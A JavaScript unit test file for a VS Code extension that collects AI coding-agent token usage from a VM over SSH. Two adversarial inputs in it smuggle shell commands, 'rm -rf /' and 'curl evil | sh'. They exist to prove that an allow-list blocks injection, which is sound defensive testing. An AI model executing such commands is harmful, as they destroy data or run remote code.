"use strict";
// Plain-node unit tests for the token-usage collector/parser. The SSH runner and the
// clock are injected (opts.runScript / opts.now) so no VM is touched. No deps.
// Run: node usage.test.js
const fs = require("fs");
const path = require("path");
const usage = require("../src/usage");

let pass = 0, fail = 0;
function ok(name, cond, detail) {
  if (cond) { pass++; console.log("  PASS  " + name); }
  else { fail++; console.log("  FAIL  " + name + (detail ? "   << " + detail : "")); }
}

// A realistic combined collector document (shape from Get-AgentUsage.ps1's jq output).
// NOTE the deliberate cost-field difference: claude/opencode carry totals.totalCost,
// codex carries totals.costUSD (the roadmap's "costUSD"). The parser must accept both.
function realisticCombined() {
  return {
    generatedAt: "2026-07-01T00:00:00Z",
    vmHost: "agent-vm",
    report: "daily",
    window: "daily --since 20260701 --until 20260701",
    tools: {
      claude: { sessions: [], totals: { totalTokens: 1425080461, totalCost: 1272.2086677 } },
      codex: { sessions: [], totals: { totalTokens: 87007562, costUSD: 85.778229 } },
      opencode: { sessions: [], totals: { totalTokens: 2426183, totalCost: 0.762877692 } },
    },
  };
}

(async () => {
  // ── normalizeReport (allow-list; defends the remote script builder) ──────────
  ok("normalizeReport: known views pass (daily/monthly/total)", usage.normalizeReport("daily") === "daily" && usage.normalizeReport("monthly") === "monthly" && usage.normalizeReport("total") === "total");
  ok("normalizeReport: unsupported granularities collapse to default (weekly/session)", usage.normalizeReport("weekly") === "daily" && usage.normalizeReport("session") === "daily");
  ok("normalizeReport: unknown -> default daily", usage.normalizeReport("bogus") === "daily");
  ok("normalizeReport: empty/undefined -> default", usage.normalizeReport("") === "daily" && usage.normalizeReport(undefined) === "daily");
  // Adversarial: an injection attempt in the report must not survive into the script.
  ok("normalizeReport: injection attempt rejected -> default",
    usage.normalizeReport('daily"; rm -rf / #') === "daily");

  // ── buildUsageScript (mirrors Get-AgentUsage.ps1; injection-safe) ────────────
  const script = usage.buildUsageScript("daily");
  ok("script: sets the validated report", /^set -u\nREPORT="daily"\n/.test(script));
  ok("script: ensures a ccusage runner (ccusage/bunx/npx)", /command -v ccusage/.test(script) && /bunx ccusage@latest/.test(script) && /npx -y ccusage@latest/.test(script));
  ok("script: runs each of the three agents", /capture claude/.test(script) && /capture codex/.test(script) && /capture opencode/.test(script));
  ok("script: combines into one JSON object with a tools map", /jq -n/.test(script) && /tools: \{ claude: \$claude, codex: \$codex, opencode: \$opencode \}/.test(script));
  ok("script: per-tool failure yields a JSON {error} object, not an abort", /\{error:\("ccusage failed for "\+\$t\)/.test(script));
  // The window is derived from the VM's own clock; each view maps to a case branch.
  ok("script: derives today from the VM's own date (not caller input)", /TODAY="\$\(date \+%Y%m%d\)"/.test(script));
  ok("script: daily view = today's window", /\*\)\s+ARGS=\(daily --since "\$TODAY" --until "\$TODAY"\) ;;/.test(script));
  ok("script: monthly view = 1st-of-month..today window", /monthly\)\s+ARGS=\(monthly --since "\$\(date \+%Y%m01\)" --until "\$TODAY"\) ;;/.test(script));
  ok("script: total view = no window (all-time totals)", /total\)\s+ARGS=\(monthly\) ;;/.test(script));
  ok("script: capture runs ccusage with the built ARGS", /"\$\{CC\[@\]\}" "\$tool" "\$\{ARGS\[@\]\}" --json/.test(script));
  ok("script: emits report + window in the combined JSON", /report: \$report,\n\s*window: \$window,/.test(script));
  // The monthly/total builds carry their own REPORT= (and the same case, injection-safe).
  ok("script: monthly build sets REPORT=monthly", /^set -u\nREPORT="monthly"\n/.test(usage.buildUsageScript("monthly")));
  ok("script: total build sets REPORT=total", /^set -u\nREPORT="total"\n/.test(usage.buildUsageScript("total")));
  // A hostile report value can't break out of the double-quoted bash string, because
  // buildUsageScript normalizes against the allow-list first.
  const hostile = usage.buildUsageScript('daily"; curl evil | sh; echo "');
  ok("script: hostile report is normalized, not interpolated", /REPORT="daily"\n/.test(hostile) && !/curl evil/.test(hostile));

  // ── formatTokens ─────────────────────────────────────────────────────────────
  ok("formatTokens: billions", usage.formatTokens(1425080461) === "1.4B");
  ok("formatTokens: millions", usage.formatTokens(87007562) === "87M");
  ok("formatTokens: fractional millions", usage.formatTokens(2426183) === "2.4M");
  ok("formatTokens: thousands", usage.formatTokens(45678) === "45.7K");
  ok("formatTokens: drops trailing .0 (12M not 12.0M)", usage.formatTokens(12000000) === "12M");
  ok("formatTokens: sub-thousand rounds", usage.formatTokens(987) === "987");
  ok("formatTokens: zero -> 0", usage.formatTokens(0) === "0");
  ok("formatTokens: negative/NaN/undefined -> 0", usage.formatTokens(-5) === "0" && usage.formatTokens(NaN) === "0" && usage.formatTokens(undefined) === "0");
  ok("formatTokens: string number coerces", usage.formatTokens("1500000") === "1.5M");

  // ── formatCost ───────────────────────────────────────────────────────────────
  ok("formatCost: thousands separator", usage.formatCost(1272.2086677) === "$1,272.21");
  ok("formatCost: small value two decimals", usage.formatCost(0.762877692) === "$0.76");
  ok("formatCost: whole dollars", usage.formatCost(85) === "$85.00");
  ok("formatCost: millions separators", usage.formatCost(1234567.891) === "$1,234,567.89");
  ok("formatCost: zero -> $0.00", usage.formatCost(0) === "$0.00");
  ok("formatCost: negative/NaN -> $0.00", usage.formatCost(-1) === "$0.00" && usage.formatCost(NaN) === "$0.00");
  ok("formatCost: rounds to cents", usage.formatCost(1.005) === "$1.00" || usage.formatCost(1.005) === "$1.01"); // FP rounding either way is acceptable

  // ── parseToolUsage ───────────────────────────────────────────────────────────
  ok("parseToolUsage: totalCost path", (() => { const u = usage.parseToolUsage({ totals: { totalTokens: 100, totalCost: 1.5 } }); return u.tokens === 100 && u.cost === 1.5; })());
  ok("parseToolUsage: costUSD path (codex)", (() => { const u = usage.parseToolUsage({ totals: { totalTokens: 200, costUSD: 2.5 } }); return u.tokens === 200 && u.cost === 2.5; })());
  ok("parseToolUsage: totalCost preferred over costUSD when both present", (() => { const u = usage.parseToolUsage({ totals: { totalTokens: 1, totalCost: 9, costUSD: 3 } }); return u.cost === 9; })());
  ok("parseToolUsage: missing cost -> 0 (tokens still exact)", (() => { const u = usage.parseToolUsage({ totals: { totalTokens: 42 } }); return u.tokens === 42 && u.cost === 0; })());
  ok("parseToolUsage: {error} object -> null (agent errored)", usage.parseToolUsage({ error: "ccusage failed for codex", detail: "boom" }) === null);
  ok("parseToolUsage: no totals -> null", usage.parseToolUsage({ sessions: [] }) === null);
  ok("parseToolUsage: zero tokens -> null (never ran; not a $0 row)", usage.parseToolUsage({ totals: { totalTokens: 0, totalCost: 0 } }) === null);
  ok("parseToolUsage: negative/NaN tokens -> null", usage.parseToolUsage({ totals: { totalTokens: -1 } }) === null && usage.parseToolUsage({ totals: { totalTokens: "x" } }) === null);
  ok("parseToolUsage: null / non-object -> null", usage.parseToolUsage(null) === null && usage.parseToolUsage("nope") === null && usage.parseToolUsage(undefined) === null);
  ok("parseToolUsage: negative cost clamps to 0", (() => { const u = usage.parseToolUsage({ totals: { totalTokens: 5, totalCost: -3 } }); return u.cost === 0; })());

  // ── parseUsage (realistic) ───────────────────────────────────────────────────
  const st = usage.parseUsage(realisticCombined());
  ok("parseUsage: three rows in TOOLS order", st.tools.length === 3 && st.tools[0].id === "claude" && st.tools[1].id === "codex" && st.tools[2].id === "opencode");
  ok("parseUsage: labels match the panel", st.tools[0].label === "Claude Code" && st.tools[1].label === "Codex" && st.tools[2].label === "OpenCode");
  ok("parseUsage: exact token counts retained (bar source of truth)", st.tools[0].tokens === 1425080461);
  ok("parseUsage: per-row formatted text", st.tools[0].tokensText === "1.4B" && st.tools[0].costText === "$1,272.21");
  ok("parseUsage: codex cost from costUSD", st.tools[1].costText === "$85.78");
  ok("parseUsage: totals sum exact tokens + estimated cost", st.totalTokensText === "1.5B" && st.totalCostText === "$1,358.75");

  // ── parseUsage (partial / malformed / empty) ─────────────────────────────────
  // One tool errored, one has no usage, one is real -> only the real row survives.
  const partial = usage.parseUsage({
    tools: {
      claude: { error: "ccusage failed for claude", detail: "network" },
      codex: { totals: { totalTokens: 0 } }, // never ran
      opencode: { totals: { totalTokens: 5000000, totalCost: 1.23 } },
    },
  });
  ok("parseUsage: skips errored + zero tools, keeps the real one", partial.tools.length === 1 && partial.tools[0].id === "opencode");
  ok("parseUsage: partial totals reflect only surviving rows", partial.totalTokensText === "5M" && partial.totalCostText === "$1.23");

  ok("parseUsage: all tools errored -> null (no misleading empty table)", usage.parseUsage({ tools: { claude: { error: "x" }, codex: { error: "y" }, opencode: { error: "z" } } }) === null);
  ok("parseUsage: all tools zero -> null", usage.parseUsage({ tools: { claude: { totals: { totalTokens: 0 } }, codex: { totals: { totalTokens: 0 } }, opencode: { totals: { totalTokens: 0 } } } }) === null);
  ok("parseUsage: missing tools map -> null", usage.parseUsage({ generatedAt: "x" }) === null);
  ok("parseUsage: null / non-object -> null", usage.parseUsage(null) === null && usage.parseUsage("junk") === null && usage.parseUsage(42) === null);
  ok("parseUsage: tools is an array, not a map -> null (no crash)", usage.parseUsage({ tools: [] }) === null);
  ok("parseUsage: unexpected extra tool key ignored", (() => { const u = usage.parseUsage({ tools: { claude: { totals: { totalTokens: 1000000, totalCost: 1 } }, gemini: { totals: { totalTokens: 999 } } } }); return u.tools.length === 1 && u.tools[0].id === "claude"; })());

  // ── collectOnce (injected runScript) ─────────────────────────────────────────
  const good = JSON.stringify(realisticCombined());
  const runOk = (out, code = 0) => async () => ({ code, stdout: out, stderr: "" });

  const c1 = await usage.collectOnce({ runScript: runOk(good) });
  ok("collectOnce: parses a good run", c1 && c1.tools.length === 3 && c1.totalCostText === "$1,358.75");

  const c2 = await usage.collectOnce({ runScript: runOk(good, 7) });
  ok("collectOnce: non-zero exit -> null", c2 === null);

  const c3 = await usage.collectOnce({ runScript: runOk("") });
  ok("collectOnce: empty stdout -> null", c3 === null);

  const c4 = await usage.collectOnce({ runScript: runOk("{not json") });
  ok("collectOnce: malformed JSON -> null", c4 === null);

  const c5 = await usage.collectOnce({ runScript: async () => ({ code: -1, stdout: "", stderr: "unreachable" }) });
  ok("collectOnce: unreachable (code<0) -> null", c5 === null);

  const c6 = await usage.collectOnce({ runScript: async () => { throw new Error("runner blew up"); } });
  ok("collectOnce: a throwing runner -> null (never rejects)", c6 === null);

  // The report chosen is validated and reaches the script.
  let seenScript = null;
  await usage.collectOnce({ report: "daily", runScript: async (s) => { seenScript = s; return { code: 0, stdout: good }; } });
  ok("collectOnce: passes the chosen (valid) report into the script", /REPORT="daily"\n/.test(seenScript));

  // ── collect cache (injected clock; single in-flight) ─────────────────────────
  usage.clearCache();
  let calls = 0;
  const counting = (out, code = 0) => async () => { calls++; return { code, stdout: out, stderr: "" }; };

  calls = 0;
  const g1 = await usage.collect({ runScript: counting(good), now: () => 1000 });
  ok("cache: first collect runs the collector and returns usage", g1 && g1.tools.length === 3 && calls === 1);
  const g2 = await usage.collect({ runScript: counting(good), now: () => 1000 + 60 * 1000 });
  ok("cache: success served within TTL (no re-run at +1min)", g2 && calls === 1);
  const g3 = await usage.collect({ runScript: counting(good), now: () => 1000 + 6 * 60 * 1000 });
  ok("cache: success re-collected after TTL (+6min)", g3 && calls === 2);

  usage.clearCache();
  calls = 0;
  const f1 = await usage.collect({ runScript: counting("", 5), now: () => 2000 });
  ok("cache: a failure caches null", f1 === null && calls === 1);
  const f2 = await usage.collect({ runScript: counting(good), now: () => 2000 + 30 * 1000 });
  ok("cache: failure served within negative TTL (no re-run at +30s)", f2 === null && calls === 1);
  const f3 = await usage.collect({ runScript: counting(good), now: () => 2000 + 90 * 1000 });
  ok("cache: failure expires after negative TTL (re-run at +90s recovers)", f3 && f3.tools.length === 3 && calls === 2);

  // Concurrent collects share one in-flight collection (no parallel ccusage runs).
  usage.clearCache();
  calls = 0;
  let release;
  const gate = new Promise((r) => { release = r; });
  const slow = async () => { await gate; calls++; return { code: 0, stdout: good }; };
  const pA = usage.collect({ runScript: slow, now: () => 3000 });
  const pB = usage.collect({ runScript: slow, now: () => 3000 });
  release();
  const [rA, rB] = await Promise.all([pA, pB]);
  ok("cache: overlapping collects coalesce into one run", rA && rB && calls === 1);

  // noCache always runs (tests / forced refresh).
  usage.clearCache();
  calls = 0;
  await usage.collect({ runScript: counting(good), noCache: true, now: () => 4000 });
  await usage.collect({ runScript: counting(good), noCache: true, now: () => 4000 });
  ok("cache: noCache bypasses the cache (two runs)", calls === 2);

  // The cache is keyed by report: switching daily<->total must re-collect (never serve
  // the other view's numbers), but returning to a still-fresh view is instant.
  usage.clearCache();
  calls = 0;
  await usage.collect({ runScript: counting(good), report: "daily", now: () => 5000 });
  ok("cache: daily collect runs once", calls === 1);
  await usage.collect({ runScript: counting(good), report: "total", now: () => 5000 });
  ok("cache: switching to total re-collects (different view)", calls === 2);
  await usage.collect({ runScript: counting(good), report: "daily", now: () => 5000 });
  ok("cache: switching back to daily served from cache (still fresh)", calls === 2);

  // ── isCurrentReport + async ordering (stale collection is discardable) ────────
  ok("isCurrentReport: same view is current", usage.isCurrentReport("total", "total") === true);
  ok("isCurrentReport: different view is stale", usage.isCurrentReport("daily", "total") === false);
  ok("isCurrentReport: normalizes both sides (weekly/bogus -> daily)", usage.isCurrentReport("weekly", "bogus") === true);

  // The race the extension must survive: a SLOW daily collect that resolves AFTER the user
  // switched to total. Each collect must carry ONLY its own view's numbers (per-report
  // cache/runner keyed by the script's REPORT), and isCurrentReport must flag the late
  // daily result as stale so the extension discards it instead of clobbering the total view.
  usage.clearCache();
  const dailyDoc = JSON.stringify({ tools: { claude: { totals: { totalTokens: 111, totalCost: 1 } } } });
  const totalDoc = JSON.stringify({ tools: { claude: { totals: { totalTokens: 222, totalCost: 2 } } } });
  let releaseDaily;
  const dailyGate = new Promise((r) => { releaseDaily = r; });
  // One runner that returns each view's doc based on the script's REPORT, and stalls the
  // daily run behind a gate so it deterministically finishes LAST.
  const byReport = async (script) => {
    if (/REPORT="total"/.test(script)) return { code: 0, stdout: totalDoc };
    await dailyGate; return { code: 0, stdout: dailyDoc };
  };
  let currentReport = "daily";
  const pDaily = usage.collect({ runScript: byReport, report: "daily", now: () => 6000 }).then((u) => ({ report: "daily", u }));
  currentReport = "total"; // user switches while daily is still in flight
  const pTotal = usage.collect({ runScript: byReport, report: "total", now: () => 6000 }).then((u) => ({ report: "total", u }));
  const tRes = await pTotal;
  ok("async: total result is current and carries total numbers",
    usage.isCurrentReport(tRes.report, currentReport) && tRes.u.tools[0].tokens === 222);
  releaseDaily();
  const dRes = await pDaily;
  ok("async: late daily result carries daily numbers but is flagged stale (discarded)",
    dRes.u.tools[0].tokens === 111 && usage.isCurrentReport(dRes.report, currentReport) === false);

  // ── augment (folds usage into state; best-effort) ────────────────────────────
  const base = { online: true, host: "h" };
  const a1 = await usage.augment(base, { runScript: runOk(good), noCache: true });
  ok("augment: folds usage into state", a1.usage && a1.usage.tools.length === 3 && a1 !== base);
  ok("augment: does not mutate input", base.usage === undefined);

  const aOff = await usage.augment({ online: false }, { runScript: runOk(good), noCache: true });
  ok("augment: offline -> unchanged, never collects", aOff.usage === undefined && aOff.online === false);

  const aFail = await usage.augment(base, { runScript: runOk("", 9), noCache: true });
  ok("augment: collection failure -> same state ref (skip re-push)", aFail === base);

  const aEmpty = await usage.augment(base, { runScript: runOk(JSON.stringify({ tools: { claude: { error: "x" }, codex: { error: "y" }, opencode: { error: "z" } } })), noCache: true });
  ok("augment: nothing parseable -> same state ref (skip re-push)", aEmpty === base);

  ok("augment: null/non-object state passthrough", (await usage.augment(null, {})) === null && (await usage.augment(undefined, {})) === undefined);

  // online is undefined (unknown) -> augment still tries (only online===false skips).
  const aUnknown = await usage.augment({ host: "h" }, { runScript: runOk(good), noCache: true });
  ok("augment: undefined online still attempts collection", aUnknown.usage && aUnknown.usage.tools.length === 3);

  // ── collectRaw (export path) ─────────────────────────────────────────────────
  const raw1 = await usage.collectRaw({ runScript: runOk(good) });
  ok("collectRaw: returns the raw JSON string on success", typeof raw1 === "string" && JSON.parse(raw1).report === "daily");
  ok("collectRaw: non-zero exit -> null", (await usage.collectRaw({ runScript: runOk(good, 3) })) === null);
  ok("collectRaw: malformed JSON -> null (never writes garbage)", (await usage.collectRaw({ runScript: runOk("{bad") })) === null);
  ok("collectRaw: empty -> null", (await usage.collectRaw({ runScript: runOk("") })) === null);
  ok("collectRaw: throwing runner -> null", (await usage.collectRaw({ runScript: async () => { throw new Error("x"); } })) === null);

  // ── buildExportPayload ───────────────────────────────────────────────────────
  const payloadStr = usage.buildExportPayload(good, { savedAt: "2026-07-01T12:00:00Z" });
  const payload = JSON.parse(payloadStr);
  ok("export: pretty-printed JSON string", payloadStr.includes("\n  ") && typeof payloadStr === "string");
  ok("export: carries savedAt + source", payload.savedAt === "2026-07-01T12:00:00Z" && payload.source === "construct-control-panel");
  ok("export: embeds the raw combined ccusage document", payload.ccusage && payload.ccusage.report === "daily" && payload.ccusage.tools.claude);
  ok("export: includes the parsed summary table", payload.summary && payload.summary.tools.length === 3 && payload.summary.totalCostText === "$1,358.75");
  ok("export: records the report granularity", payload.report === "daily");

  // Malformed raw text still yields a valid envelope (export must never throw).
  const badPayload = JSON.parse(usage.buildExportPayload("{not json", { savedAt: "t" }));
  ok("export: malformed raw -> minimal envelope, ccusage null, summary null", badPayload.ccusage === null && badPayload.summary === null && badPayload.savedAt === "t");
  const nullPayload = JSON.parse(usage.buildExportPayload(null, { savedAt: "t" }));
  ok("export: null raw -> minimal envelope", nullPayload.ccusage === null && nullPayload.summary === null);
  ok("export: default savedAt is set when omitted", typeof JSON.parse(usage.buildExportPayload(good)).savedAt === "string");

  // ── exportFileName ───────────────────────────────────────────────────────────
  const fn = usage.exportFileName("total", new Date(2026, 6, 1, 14, 30, 5)); // month is 0-based -> July
  ok("exportFileName: construct-usage-<report>-<stamp>.json", fn === "construct-usage-total-20260701-143005.json", fn);
  ok("exportFileName: invalid report normalized in the name", usage.exportFileName("bogus", new Date(2026, 0, 2, 3, 4, 5)) === "construct-usage-daily-20260102-030405.json");
  ok("exportFileName: zero-pads month/day/time", usage.exportFileName("daily", new Date(2026, 0, 2, 3, 4, 5)) === "construct-usage-daily-20260102-030405.json");

  // ── describeExport (the captured identity of ONE export) ─────────────────────
  // The export's file name and its two labels are derived ONCE, from the report and the
  // instance the click was captured for — not re-read after the collection, which is when
  // both of them can have changed.
  const desc = usage.describeExport({ report: "monthly", instance: "work-vm", at: new Date(2026, 6, 1, 14, 30, 5) });
  ok("describeExport: the file name carries the CAPTURED period",
    desc.fileName === "construct-usage-monthly-20260701-143005.json", desc.fileName);
  ok("describeExport: the dialog names the period and the instance",
    desc.dialogTitle === "Save Construct usage report (monthly, “work-vm”)", desc.dialogTitle);
  ok("describeExport: ...and so does the confirmation",
    desc.savedMessage("/tmp/u.json") === "Usage report (monthly, “work-vm”) saved to /tmp/u.json");
  ok("describeExport: the report is normalized, so a bogus period cannot name a file",
    usage.describeExport({ report: "weekly", at: new Date(2026, 0, 2, 3, 4, 5) }).fileName
      === "construct-usage-daily-20260102-030405.json");
  const noInstance = usage.describeExport({ report: "daily", at: new Date(2026, 0, 2, 3, 4, 5) });
  ok("describeExport: without an instance the labels stay the single-VM strings",
    noInstance.dialogTitle === "Save Construct usage report (daily)" &&
    noInstance.savedMessage("/tmp/u.json") === "Usage report (daily) saved to /tmp/u.json");
  ok("describeExport: whitespace around an instance name is not a label",
    usage.describeExport({ report: "daily", instance: "  " }).instance === "");

  // ── runExportUsage, modelled with a deferred collection ──────────────────────
  // A MODEL of extension.js's export command (it cannot be required under plain node — it
  // needs `vscode` — so the wiring itself is pinned at the source below, the same way
  // forwarder.test.js pins the forwarder's). The model is the production ORDER with the
  // production helper: capture instance+report, collect, check the generation, then the
  // failure branch, the dialog, a second generation check, and only then the write. Every
  // effect is recorded, so "nothing was shown, opened or written" is an assertion rather
  // than a hope.
  //
  // `guard` selects the shape: "checked" is this change; "after-failure" is the shape the
  // reviewer caught (the check sitting below the `!rawText` branch, so a failed collection
  // still toasts into the other instance's window); "none" is the pre-fix original, which
  // re-read the live instance and period after the collection.
  async function runExportModel(opts) {
    const o = opts || {};
    const guard = o.guard || "checked";
    const live = { instance: "agent-vm", report: "monthly" };
    const effects = [];
    // actionTarget() + describeExport(), BEFORE the slow part.
    const captured = { instance: live.instance, report: live.report };
    const exportOf = usage.describeExport({ ...captured, at: new Date(2026, 6, 1, 14, 30, 5) });
    // targetSuperseded(): the window's generation, as extension.js asks it.
    const superseded = () => live.instance !== captured.instance;
    const abort = (why) => { effects.push("aborted:" + why); return true; };
    const run = (async () => {
      const rawText = await o.collect();
      // The pre-fix shape re-derived everything here instead of using the capture.
      const desc = guard === "none"
        ? usage.describeExport({ instance: live.instance, report: live.report, at: new Date(2026, 6, 1, 14, 30, 5) })
        : exportOf;
      if (guard === "checked" && superseded()) return abort("after-collect");
      if (!rawText) {
        effects.push("error-toast");
        return;
      }
      if (guard === "after-failure" && superseded()) return abort("after-collect");
      effects.push("dialog:" + desc.dialogTitle + "|" + desc.fileName);
      const uri = await o.dialog();
      if (!uri) return;
      if (guard !== "none" && superseded()) return abort("after-dialog");
      effects.push("write:" + uri + "|" + JSON.parse(usage.buildExportPayload(rawText, { savedAt: "t" })).report);
      effects.push("saved-toast:" + desc.savedMessage(uri));
    })();
    return { effects, run, live, exportOf };
  }

  const deferred = () => { let resolve; const promise = new Promise((r) => { resolve = r; }); return { promise, resolve }; };
  const collected = () => JSON.stringify({ report: "monthly", tools: {} });

  // 1) THE HAPPY PATH: nothing switches, and every string comes from the capture.
  {
    const m = await runExportModel({ collect: async () => collected(), dialog: async () => "/tmp/u.json" });
    await m.run;
    ok("export: the dialog is titled with the captured period and instance",
      m.effects[0] === "dialog:Save Construct usage report (monthly, “agent-vm”)|construct-usage-monthly-20260701-143005.json",
      m.effects[0]);
    ok("export: the file is written with the captured period's payload",
      m.effects[1] === "write:/tmp/u.json|monthly", m.effects[1]);
    ok("export: ...and the confirmation names both",
      m.effects[2] === "saved-toast:Usage report (monthly, “agent-vm”) saved to /tmp/u.json", m.effects[2]);
  }

  // 2) A SWITCH DURING THE COLLECTION. The answer belongs to the instance nobody is looking
  //    at any more: no dialog, no write, no toast — the abort names both instances instead.
  {
    const gate = deferred();
    const m = await runExportModel({
      collect: async () => { await gate.promise; return collected(); },
      dialog: async () => "/tmp/u.json",
    });
    m.live.instance = "work-vm";      // the user switches while the SSH round trip is out
    m.live.report = "daily";
    gate.resolve();
    await m.run;
    ok("export race: a switch during the collection aborts before anything is shown",
      m.effects.length === 1 && m.effects[0] === "aborted:after-collect", JSON.stringify(m.effects));
    ok("export race: ...so no save dialog is opened", !m.effects.some((e) => e.startsWith("dialog:")));
    ok("export race: ...and nothing is written", !m.effects.some((e) => e.startsWith("write:")));
  }
  {
    // THE PRE-FIX CONTROL: no generation check at all, and the description re-derived after
    // the collection — A's numbers offered under B's name, in B's file name, and saved.
    const gate = deferred();
    const m = await runExportModel({
      guard: "none",
      collect: async () => { await gate.promise; return collected(); },
      dialog: async () => "/tmp/u.json",
    });
    m.live.instance = "work-vm";
    m.live.report = "daily";
    gate.resolve();
    await m.run;
    ok("control: without the guard the dialog names the instance the user switched TO",
      m.effects[0] === "dialog:Save Construct usage report (daily, “work-vm”)|construct-usage-daily-20260701-143005.json",
      m.effects[0]);
    ok("control: ...and MONTHLY numbers are saved under a DAILY file name",
      m.effects[1] === "write:/tmp/u.json|monthly", m.effects[1]);
  }

  // 3) A FAILED COLLECTION PLUS A SWITCH. The generic "couldn't collect usage from the VM"
  //    toast would land in the other instance's window and accuse the wrong VM, so the
  //    generation is checked BEFORE the failure branch, not after it.
  {
    const gate = deferred();
    const m = await runExportModel({
      collect: async () => { await gate.promise; return null; },
      dialog: async () => "/tmp/u.json",
    });
    m.live.instance = "work-vm";
    gate.resolve();
    await m.run;
    ok("export race: a failed collection after a switch aborts instead of toasting",
      m.effects.length === 1 && m.effects[0] === "aborted:after-collect", JSON.stringify(m.effects));
  }
  {
    // THE CONTROL for that ordering: the guard one line lower, which is where it was.
    const gate = deferred();
    const m = await runExportModel({
      guard: "after-failure",
      collect: async () => { await gate.promise; return null; },
      dialog: async () => "/tmp/u.json",
    });
    m.live.instance = "work-vm";
    gate.resolve();
    await m.run;
    ok("control: the check below the failure branch lets the toast into the other window",
      m.effects.length === 1 && m.effects[0] === "error-toast", JSON.stringify(m.effects));
  }
  // ...and the failure toast is still shown when nothing switched.
  {
    const m = await runExportModel({ collect: async () => null, dialog: async () => "/tmp/u.json" });
    await m.run;
    ok("export: a genuine collection failure still says so",
      m.effects.length === 1 && m.effects[0] === "error-toast", JSON.stringify(m.effects));
  }

  // 4) A SWITCH WHILE THE SAVE DIALOG IS OPEN. The dialog is an await too, and the write is
  //    the irreversible step: one VM's numbers must not land on disk under a path the user
  //    chose while looking at another one.
  {
    const gate = deferred();
    const m = await runExportModel({
      collect: async () => collected(),
      dialog: async () => { await gate.promise; return "/tmp/u.json"; },
    });
    await Promise.resolve();
    m.live.instance = "work-vm";
    gate.resolve();
    await m.run;
    ok("export race: a switch during the save dialog aborts before the write",
      m.effects.some((e) => e === "aborted:after-dialog"), JSON.stringify(m.effects));
    ok("export race: ...and nothing reached the disk", !m.effects.some((e) => e.startsWith("write:")));
  }
  // A cancelled dialog writes nothing and says nothing, switch or no switch.
  {
    const m = await runExportModel({ collect: async () => collected(), dialog: async () => null });
    await m.run;
    ok("export: a cancelled dialog writes nothing",
      m.effects.length === 1 && m.effects[0].startsWith("dialog:"), JSON.stringify(m.effects));
  }

  // ── extension.js's export wiring, pinned at the source ───────────────────────
  // The model above stands in for runExportUsage; these pin the real thing, so the order
  // it models cannot drift out from under it (extension.js needs `vscode`, so it cannot be
  // required here — same approach as forwarder.test.js's source pins).
  {
    const extSrc = fs.readFileSync(path.join(__dirname, "..", "extension.js"), "utf8");
    // Just this function: the first line that is exactly "}" closes it.
    const from = extSrc.indexOf("function runExportUsage()");
    const body = extSrc.slice(from, from + extSrc.slice(from).indexOf("\n}\n") + 2);
    const at = (needle) => body.indexOf(needle);
    ok("export wiring: the instance and the report are captured BEFORE withProgress",
      at("const target = actionTarget();") >= 0 &&
      at("const exportOf = usage.describeExport({ report: usageReport, instance: target.name });") >= 0 &&
      at("const exportOf = usage.describeExport(") < at("vscode.window.withProgress("));
    ok("export wiring: the collection uses the CAPTURED cfg and report, not the live ones",
      at("await usage.collectRaw({ report: exportOf.report, cfg: target.cfg })") >= 0 &&
      at("usage.collectRaw({ report: usageReport") < 0 &&
      at("cfg: activeCfg()") < 0);
    ok("export wiring: the generation is checked immediately after the collection...",
      at('if (targetSuperseded(target, "The usage export")) return;') >= 0 &&
      at("await usage.collectRaw(") < at('if (targetSuperseded(target, "The usage export")) return;'));
    ok("export wiring: ...BEFORE the failure branch, so a late failure cannot toast elsewhere",
      at('if (targetSuperseded(target, "The usage export")) return;') < at("if (!rawText) {"));
    ok("export wiring: ...and again after the save dialog, before the write",
      body.split('if (targetSuperseded(target, "The usage export")) return;').length === 3 &&
      body.lastIndexOf('if (targetSuperseded(target, "The usage export")) return;')
        > at("vscode.window.showSaveDialog(") &&
      body.lastIndexOf('if (targetSuperseded(target, "The usage export")) return;')
        < at("await fs.promises.writeFile("));
    ok("export wiring: the dialog, the file name and the confirmation all come from the capture",
      at("title: exportOf.dialogTitle,") >= 0 &&
      at("os.homedir(), exportOf.fileName") >= 0 &&
      at("showInformationMessage(exportOf.savedMessage(uri.fsPath))") >= 0);
  }

  console.log(`\n  usage unit tests — ${pass}/${pass + fail} passed\n`);
  process.exit(fail ? 1 : 0);
})();
